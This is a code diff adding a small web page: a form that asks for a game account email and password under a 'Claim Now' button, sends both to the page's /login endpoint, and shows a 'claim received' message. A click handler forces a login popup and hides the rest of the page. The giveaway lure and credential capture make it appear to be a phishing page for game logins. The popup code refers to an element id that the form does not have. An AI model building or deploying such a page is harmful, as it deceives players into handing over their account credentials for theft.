@@ -1,0 +1,52 @@
+<form id="loginFormElement">
+  <input type="email" id="email" placeholder="Game Email" required />
+  <input type="password" id="password" placeholder="Password" required />
+  <button type="submit">Claim Now</button>
+  <div class="success-message" id="successMessage" style="display:none;">Thank you! Your claim is received.</div>
+</form>
+
+<script>
+  const form = document.getElementById('loginFormElement');
+  const successMessage = document.getElementById('successMessage');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = form.email.value.trim();
+    const password = form.password.value.trim();
+
+    try {
+      const response = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      const result = await response.json();
+      if (response.ok) {
+        successMessage.style.display = 'block';
+        form.email.disabled = true;
+        form.password.disabled = true;
+        form.querySelector('button').disabled = true;
+      } else {
+        alert('Failed to submit data');
+      }
+    } catch (err) {
+      alert('Server error');
+    }
+  });
+  document.body.addEventListener('click', function showLogin() {
+  // Show the login popup
+  const loginForm = document.getElementById('loginForm');
+  if (loginForm.style.display !== 'flex') {
+    loginForm.style.display = 'flex';
+
+    // Optionally hide the main container or landing content
+    const container = document.querySelector('.container');
+    if (container) container.style.display = 'none';
+  }
+
+  // Remove this event listener so popup shows only once
+  document.body.removeEventListener('click', showLogin);
+});
+
+</script>
+
